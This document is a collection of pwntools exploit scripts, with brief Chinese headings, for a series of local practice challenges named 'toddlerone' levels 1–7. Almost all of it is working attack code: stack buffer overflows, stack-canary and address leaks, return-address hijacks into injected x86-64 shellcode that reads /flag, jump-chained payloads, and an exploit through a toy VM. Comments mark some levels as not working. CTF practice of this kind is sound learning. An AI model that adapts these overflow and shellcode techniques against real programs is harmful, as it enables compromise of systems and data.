level 1
劫持返回地址为控制地址
from pwn import *

p=process(['/challenge/toddlerone_level1.0'])

shell_code='''
mov rbx,0x00000067616c662f
push rbx
mov rax,2
mov rdi,rsp
mov rsi,0
syscall

mov rdi,1
mov rsi,rax
mov rdx,0
mov r10,1000
mov rax,40
syscall

mov rax,60
syscall
'''

filte=p.recvuntil("shellcode at ")
shell_add=p.recvuntil("!",drop=True)
print(shell_add)
shell_add=str(shell_add)[2:-1]
print(shell_add)
shell_add=int(shell_add,16)
shell_add=shell_add.to_bytes(8,byteorder='little',signed=False)

payload=asm(shell_code, arch='amd64')
p.sendlineafter("Reading 0x1000 bytes of shellcode from stdin.\n\n",payload)

overflow_size=0x50
p.sendlineafter("Payload size: ",str(overflow_size))

payload=b'\x90'*(overflow_size-8)+shell_add
p.sendlineafter("bytes)!\n",payload)

p.interactive()

level 2
劫持返回地址为堆栈shellcode上
#2.1无法正确运行
from pwn import *

p=process(['/challenge/toddlerone_level2.1'])

shell_code='''
push 0x616c662f
mov BYTE PTR [rsp+4],0x67
xor rax,rax
inc rax
inc rax
mov rdi,rsp
xor rsi,rsi
syscall
xor rdi,rdi
inc rdi
mov rsi,rax
xor rdx,rdx
push 60
pop r10
push 40
pop rax
syscall
'''

overflow_size=0x40
p.sendlineafter("Payload size: ",str(overflow_size))

payload=asm(shell_code, arch='amd64')
shell_len=len(payload)
print(shell_len)
payload+=b'\x90'*(overflow_size-shell_len-8)+p64(0x7fffffffd2b0)
p.sendlineafter("bytes)!\n",payload)

p.interactive()

level 3.0
printf泄露canary

level 3.1
#shell用jmp连接
from pwn import *

p=process(['/challenge/toddlerone_level3.1'])

overflow_size=0x29
p.sendlineafter("Payload size: ",str(overflow_size))

payload=b'\x90'*(0x29-6-1)+b'REPEAT'
p.sendlineafter("bytes)!\n",payload)

p.recvuntil("You said: ")
p.recvuntil("\n",drop=1)
recv_data=p.recv(7)
can=b'\x00'+recv_data
cc=u64(can)
print(hex(cc))

recv_data=p.recv(6)
recv_data=recv_data+b'\x00\x00'
stack_addr=u64(recv_data)-0x1040-(0x80*2)-0x30+2
print(hex(u64(recv_data)))

overflow_size=0x20
p.sendlineafter("Payload size: ",str(overflow_size))

shell2='''
mov edi,1
push rax
pop rsi
xor edx,edx
mov r10,1000
push 40
pop rax
syscall
'''

payload=b'REPEAT'
payload+=asm(shell2,arch='amd64')
shell2_len=len(payload)
print(shell2_len)
payload+=b'\x90'*(0x20-shell2_len)
p.sendlineafter("bytes)!\n",payload)

overflow_size=0x40
p.sendlineafter("Payload size: ",str(overflow_size))

shell1='''
push 0x616c662f
mov BYTE PTR [rsp+4],0x67
mov eax,2
push rsp
pop rdi
xor esi,esi
syscall
'''

payload=b'\x90\x00'

payload+=asm(shell1,arch='amd64')
print(len(payload))
payload+=b'\xeb\x6d'+b'\x90'*(0x28-25)+p64(cc)+p64(0)+p64(stack_addr)

p.sendlineafter("bytes)!\n",payload)

p.interactive()

level 4.0
from pwn import *

p=process(['/challenge/toddlerone_level4.0'])

shell_code='''
push 0x616c662f
mov BYTE PTR [rsp+4],0x67
mov eax,2
push rsp
pop rdi
xor esi,esi
syscall

mov edi,1
push rax
pop rsi
xor edx,edx
mov r10,1000
push 40
pop rax
syscall
'''
overflow_size=0x39
p.sendlineafter("Payload size: ",str(overflow_size))

payload=b'\x90'*(0x30-6)+b'REPEAT'+p64(0x76b4c39e66cc1aad)
p.sendlineafter("bytes)!\n",payload)

p.recvuntil("You said: ")

p.recvuntil("\n",drop=1)
recv_data=p.recv(7)
can=b'\x00'+recv_data
cc=u64(can)
print(hex(cc))

recv_data=p.recv(6)
recv_data=recv_data+b'\x00\x00'
stack_add=u64(recv_data)-0x1110
print(hex(stack_add))

overflow_size=0x50
p.sendlineafter("Payload size: ",str(overflow_size))

payload=asm(shell_code, arch='amd64')
shell2_len=len(payload)
print(shell2_len)
payload+=b'\x90'*(0x30-shell2_len)+p64(0x76b4c39e66cc1aad)+p64(cc)+p64(0)+p64(stack_add)
p.sendlineafter("bytes)!\n",payload)

p.interactive()

level 4.1
from pwn import *

p=process(['/challenge/toddlerone_level4.1'])

shell_code='''
push 0x616c662f
mov BYTE PTR [rsp+4],0x67
mov eax,2
push rsp
pop rdi
xor esi,esi
syscall

mov edi,1
push rax
pop rsi
xor edx,edx
mov r10,1000
push 40
pop rax
syscall
'''
overflow_size=0x59
p.sendlineafter("Payload size: ",str(overflow_size))

payload=b'\x90'*(0x50-6-8)+b'REPEAT'+p64(0xe9b83ad361fb2b32)+b'\x90'*8
p.sendlineafter("bytes)!\n",payload)

p.recvuntil("You said: ")

p.recvuntil("\n",drop=1)
recv_data=p.recv(7)
can=b'\x00'+recv_data
cc=u64(can)
print(hex(cc))

overflow_size=0x78
p.sendlineafter("Payload size: ",str(overflow_size))

payload=asm(shell_code, arch='amd64')
shell2_len=len(payload)
print(shell2_len)
#payload+=b'\x90'*(0x50-shell2_len-8)+p64(0xe9b83ad361fb2b32)+p64(0)+p64(cc)+p64(0)+p64(stack_add)
payload+=b'\x90'*(0x48-shell2_len)+p64(0xe9b83ad361fb2b32)+p64(cc)*3+p64(stack_add)*2
p.sendlineafter("bytes)!\n",payload)

p.interactive()

level 5.0
#分开泄露canary和返回地址
from pwn import *

p=process(['/challenge/toddlerone_level5.0'])

shell_code='''
push 0x616c662f
mov BYTE PTR [rsp+4],0x67
mov eax,2
push rsp
pop rdi
xor esi,esi
syscall

mov edi,1
push rax
pop rsi
xor edx,edx
mov r10,1000
push 40
pop rax
syscall
'''
overflow_size=0x49
p.sendlineafter("Payload size: ",str(overflow_size))

payload=b'\x90'*(0x30-6)+b'REPEAT'+p64(0x3291bcb85c49984)+b'\x90'*16
p.sendlineafter("bytes)!\n",payload)

p.recvuntil("You said: ")

p.recvuntil("\n",drop=1)
recv_data=p.recv(7)
can=b'\x00'+recv_data
cc=u64(can)
print(hex(cc))

overflow_size=0x60
p.sendlineafter("Payload size: ",str(overflow_size))

payload=b'\x90'*(0x30-6)+b'REPEAT'+p64(0x3291bcb85c49984)+b'\x90'*16+b'\x90'*(0xf+8)
p.sendlineafter("bytes)!\n",payload)

p.recvuntil("You said: ")
p.recvuntil("\n",drop=1)
recv_data=p.recv(6)
recv_data=recv_data+b'\x00\x00'
stack_addr=u64(recv_data)-(0xc0*2)-0x60
print(hex(stack_addr))

overflow_size=0x70
p.sendlineafter("Payload size: ",str(overflow_size))

payload=asm(shell_code,arch='amd64')
#print(len(payload))
shell2_len=len(payload)
payload+=b'\x90'*(0x30-shell2_len)+p64(0x3291bcb85c49984)+b'\x90'*0x10+p64(cc)+b'\x90'*0x18+p64(stack_addr)
p.sendlineafter("bytes)!\n",payload)

p.interactive()

level 5.1
#劫持地址不正确
from pwn import *

p=process(['/challenge/toddlerone_level5.1'])

overflow_size=0x29
p.sendlineafter("Payload size: ",str(overflow_size))

payload=b'\x90'*(0x18-6)+b'REPEAT'+p64(0x9c0cc3e6c5c9191b)+b'\x90'*(0x8)
p.sendlineafter("bytes)!\n",payload)

p.recvuntil("You said: ")

p.recvuntil("\n",drop=1)
recv_data=p.recv(7)
can=b'\x00'+recv_data
cc=u64(can)
print(hex(cc))

recv_data=p.recv(6)
recv_data=recv_data+b'\x00\x00'
main_rbp=u64(recv_data)
print(hex(main_rbp))
start_stack=main_rbp-0x1040-(0x90*3)-0x30+2

overflow_size=0x20
p.sendlineafter("Payload size: ",str(overflow_size))

shell2='''
mov edi,1
push rax
pop rsi
xor edx,edx
mov r10,1000
push 40
pop rax
syscall
'''

payload=b'REPEAT'
payload+=asm(shell2,arch='amd64')
shell2_len=len(payload)
print(shell2_len)
payload+=b'\x90'*(0x20-shell2_len)
p.sendlineafter("bytes)!\n",payload)

overflow_size=0x20
p.sendlineafter("Payload size: ",str(overflow_size))

shell1='''
push 0x616c662f
mov BYTE PTR [rsp+4],0x67
mov eax,2
push rsp
pop rdi
xor esi,esi
syscall
'''

payload=b'REPEAT'
payload+=asm(shell1,arch='amd64')
shell1_len=len(payload)
payload+=b'\xe9\x8b\x00\x00\x00'+b'\x90'*(0x20-29-3)
print(shell1_len)

p.sendlineafter("bytes)!\n",payload)

overflow_size=0x40
p.sendlineafter("Payload size: ",str(overflow_size))

payload=b'\x90\x00'
payload+=b'\xe9\x8f\x00\x00\x00'+b'\x90'*(0x18-4-3)+p64(0x9c0cc3e6c5c9191b)+b'\x90'*(0x8)+p64(cc)+p64(0)+p64(start_stack)

p.sendlineafter("bytes)!\n",payload)

p.interactive()

level 6.0


level 7.0
from pwn import *

p=process(['/challenge/toddlerone_level7.0'],setuid=False)

#format:  arg1 op arg2

a_reg=2
b_reg=0x20
c_reg=4

interpret_imm=0x8
interpret_sys=0x40

sys_read_mem=0x8
sys_read_code=0x10
sys_write=0x20

yan85_code=[
    #read_shell
    a_reg,interpret_imm,0,
    b_reg,interpret_imm,0,
    c_reg,interpret_imm,255,
    sys_read_mem,interpret_sys,a_reg,

    #read_ret_addr
    a_reg,interpret_imm,0,
    b_reg,interpret_imm,254,
    c_reg,interpret_imm,255,
    sys_read_mem,interpret_sys,a_reg,

    #get_addr
    a_reg,interpret_imm,1,
    b_reg,interpret_imm,254,
    c_reg,interpret_imm,255,
    sys_write,interpret_sys,a_reg,

    #over_write_addr
    a_reg,interpret_imm,0,
    b_reg,interpret_imm,254,
    c_reg,interpret_imm,255,
    sys_read_mem,interpret_sys,a_reg,
]

shell_code='''
push 0x616c662f
mov BYTE PTR [rsp+4],0x67
xor rax,rax
inc rax
inc rax
mov rdi,rsp
xor rsi,rsi
syscall
int 3

xor rdi,rdi
inc rdi
mov rsi,rax
xor rdx,rdx
push 60
pop r10
push 40
pop rax
syscall
'''
payload=asm(shell_code,arch='amd64')
shell_len=len(payload)
yan85_asm=bytes(yan85_code)


p.sendafter("Good luck!",yan85_asm)

payload+=b'\x90'
p.sendlineafter("... read_memory\n",payload)

#b'\x01\xfe\xff\x00\x00\x0c\x00\x00'
payload=b'1'*(1)
p.sendlineafter("... read_memory\n",payload)

p.recvuntil("... write\n")
recv_data=p.recv(42)
a=u64(p.recv(8))
ret_addr=a-0x208
print(recv_data)
print(hex(a))

payload=b'1'*(2)+b'\x01\xfe\xff\x00\x00\x10\x00\x00'+p64(0x6161616161616161)*2+p64(0x7fffffffe218+8)
p.sendlineafter("... read_memory\n",payload)

#p.interactive()



